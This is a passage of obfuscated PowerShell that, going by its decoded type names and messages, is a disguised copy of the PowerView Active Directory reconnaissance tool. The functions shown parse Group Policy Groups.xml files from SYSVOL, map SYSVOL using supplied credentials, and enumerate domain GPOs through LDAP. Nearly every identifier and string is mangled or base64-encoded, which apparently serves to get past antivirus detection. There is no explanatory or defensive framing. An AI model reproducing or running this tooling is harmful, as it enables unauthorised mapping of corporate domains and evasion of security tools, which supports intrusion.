                ${/==\/===\_/\/\_/=} = __/\___/=\____/==\ -Path ${_/=\/=\_/\__/\/=\} -__/\/\_/=\/===\/\/ -ErrorAction Stop
                if (${/==\/===\_/\/\_/=}) {
                    ${/==\/===\_/\/\_/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${_/=\/=\_/\__/\/=\}
                    ${/==\/===\_/\/\_/=}
                }
            }
            else {
                ${/==\/===\_/\/\_/=} = __/\___/=\____/==\ -Path ${_/=\/=\_/\__/\/=\} -ErrorAction Stop
                if (${/==\/===\_/\/\_/=}) {
                    ${/==\/===\_/\/\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${_/=\/=\_/\__/\/=\}
                    ${/==\/===\_/\/\_/=}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIAAkAHsAXwAvAD0AXAAvAD0AXABfAC8AXABfAF8ALwBcAC8APQBcAH0AIAA6ACAAJABfAA==')))
        }
    }
    END {
        ${____/\_____/===\/}.Keys | % { __/======\__/===\_ -Path $_ }
    }
}
function __/=====\_/\/=\_/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${____/\_____/===\/} = @{}
    }
    PROCESS {
        try {
            if (($GroupsXMLPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${_/=\__/=\_/\/=\/=} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${____/\_____/===\/}[${_/=\__/=\_/\/=\/=}]) {
                    _/=\____/\/\/=\__/ -Path ${_/=\__/=\_/\/=\/=} -Credential $Credential
                    ${____/\_____/===\/}[${_/=\__/=\_/\/=\/=}] = $True
                }
            }
            [XML]${/=\_/\__/=\__/\/\} = gc -Path $GroupsXMLPath -ErrorAction Stop
            ${/=\_/\__/=\__/\/\} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
                ${_/\/\_/===\_/=\/\} = $_.Properties.groupName
                ${_/==\_/=\_/======} = $_.Properties.groupSid
                if (-not ${_/==\_/=\_/======}) {
                    if (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    elseif (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${_/==\_/=\_/======} = ___/\___/\/===\_/= -_/\/\_/\____/\/== ${_/\/\_/===\_/=\/\} -Credential $Credential
                        }
                        else {
                            ${_/==\_/=\_/======} = ___/\___/\/===\_/= -_/\/\_/\____/\/== ${_/\/\_/===\_/=\/\}
                        }
                    }
                }
                ${_____/\/===\/=\_/} = $_.Properties.members | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if (${_____/\/===\/=\_/}) {
                    if ($_.filters) {
                        ${/===\____/\/\/\/\} = $_.filters.GetEnumerator() | % {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        ${/===\____/\/\/\/\} = $Null
                    }
                    if (${_____/\/===\/=\_/} -isnot [System.Array]) { ${_____/\/===\/=\_/} = @(${_____/\/===\/=\_/}) }
                    ${_/==\/=====\__/==} = New-Object PSObject
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) ${/===\____/\/\/\/\}
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${_/==\_/=\_/======}
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    ${_/==\/=====\__/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${_____/\/===\/=\_/}
                    ${_/==\/=====\__/==}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
                    ${_/==\/=====\__/==}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcgBvAHUAcABzAFgATQBMAF0AIABFAHIAcgBvAHIAIABwAGEAcgBzAGkAbgBnACAAJABUAGEAcgBnAGUAdABHAHIAbwB1AHAAcwBYAE0ATABQAGEAdABoACAAOgAgACQAXwA=')))
        }
    }
    END {
        ${____/\_____/===\/}.Keys | % { __/======\__/===\_ -Path $_ }
    }
}
function ____/===\__/=\__/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_____/=\/==\_/\/\/},
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/\/==\/\__/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if (${__/\/==\/\__/===\}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                ${/===============\} = @()
                if (${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${_/=\/\/\/==\/\/==} = ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
                ${_/=\/=====\/\_/==} = $Null
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_____/=\/==\_/\/\/}
                    ${/\_______/\/\/=\/} = __/\/\/=\/\_/==\/\ @_/\/\/\/\___/\/\/ -FindOne | select -First 1
                    if(-not ${/\_______/\/\/=\/}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABDAG8AbQBwAHUAdABlAHIAIAAnACQAewBfAF8AXwBfAF8ALwA9AFwALwA9AD0AXABfAC8AXAAvAFwALwB9ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${_/\_/=\____/===\/} = ${/\_______/\/\/=\/}.distinguishedname
                    ${_/=\/=====\/\_/==} = ${/\_______/\/\/=\/}.dnshostname
                }
                else {
                    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    ${_/==\/=\___/=====\} = ____/\/====\/\___/ @_/\/\/\/\___/\/\/ -FindOne | select -First 1
                    if(-not ${_/==\/=\___/=====\}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAZQByACAAJwAkAFUAcwBlAHIASQBkAGUAbgB0AGkAdAB5ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${_/\_/=\____/===\/} = ${_/==\/=\___/=====\}.distinguishedname
                }
                ${/=\/=\_/\/\/==\/\} = @()
                ${/=\/=\_/\/\/==\/\} += ${_/\_/=\____/===\/}.split(',') | % {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${_/\_/=\____/===\/}.SubString(${_/\_/=\____/===\/}.IndexOf("$($_),"))
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABvAGIAagBlAGMAdAAgAE8AVQBzADoAIAAkAHsALwA9AFwALwA9AFwAXwAvAFwALwBcAC8APQA9AFwALwBcAH0A')))
                if (${/=\/=\_/\/\/==\/\}) {
                    ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    ${_/\______/\/\____} = $False
                    ForEach(${__/===\/\_/=\/=\/} in ${/=\/=\_/\/\/==\/\}) {
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${__/===\/\_/=\/=\/}
                        ${/===============\} += _/====\/\/\/\/\/=\ @_/\/\/\/\___/\/\/ | % {
                            if ($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        ${_/=\/\/\__/=\/===} = $_.split(';')
                                        ${_/\/=\_/\__/\/=\/} = ${_/=\/\/\__/=\/===}[0]
                                        ${/==\/===\/\_/\__/} = ${_/=\/\/\__/=\/===}[1]
                                        if (${_/\______/\/\____}) {
                                            if (${/==\/===\/\_/\__/} -eq 2) {
                                                ${_/\/=\_/\__/\/=\/}
                                            }
                                        }
                                        else {
                                            ${_/\/=\_/\__/\/=\/}
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                ${_/\______/\/\____} = $True
                            }
                        }
                    }
                }
                if (${_/=\/=====\/\_/==}) {
                    ${_/==\/=\_/\_/=\_/} = (_/==\/==\/\/\__/\_ -/=\/\/\/=\__/\_/= ${_/=\/=====\/\_/==}).SiteName
                    if(${_/==\/=\_/\_/=\_/} -and (${_/==\/=\_/\_/=\_/} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_/==\/=\_/\_/=\_/}
                        ${/===============\} += _/\____/\____/===\ @_/\/\/\/\___/\/\/ | % {
                            if($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                ${___/\____/=\_/=\/} = ${_/\_/=\____/===\/}.SubString(${_/\_/=\____/===\/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))
                ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJAB7AF8AXwBfAC8AXABfAF8AXwBfAC8APQBcAF8ALwA9AFwALwB9ACkA')))
                ${/===============\} += _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
                    if($_.gplink) {
                        $_.gplink.split('][') | % {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABHAFAATwBBAGQAcwBQAGEAdABoAHMAOgAgACQAewAvAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AFwAfQA=')))
                if (${_/=\/\/\/==\/\/==}) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${_/=\/\/\/==\/\/==} }
                else { ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${/===============\} | ? {$_ -and ($_ -ne '')} | % {
                    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQBjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        }
                        $_
                    }
                }
            }
            else {
                ${__/\_/==\_/\/\___} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAnAA==')))
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                            ${__/\/==\/\__/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                            if (-not ${__/\/==\/\__/===\}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnAA==')))
                            }
                        }
                    }
                    elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAuACoAfQA=')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkA')))
                    }
                    else {
                        try {
                            ${_/=\_/=====\__/=\} = (-Join (([Guid]${/\______/===\__/\}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                            ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                        }
                        catch {
                            ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                        }
                    }
                }
                if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${__/\/==\/\__/===\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGPO] filter string: $(${__/\/==\/\__/===\}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${__/\/==\/\__/===\}.FindOne() }
                else { ${_/\__/\/=====\_/\} = ${__/\/==\/\__/===\}.FindAll() }
                ${_/\__/\/=====\_/\} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${__/\_/\/==\/\__/=} = $_
                        ${__/\_/\/==\/\__/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            ${__/\_/\/==\/\__/=} = _______/==\_/=\_/= -Properties $_.Properties
                            try {
                                ${_/\/=\_/\__/\/=\/} = ${__/\_/\/==\/\__/=}.distinguishedname
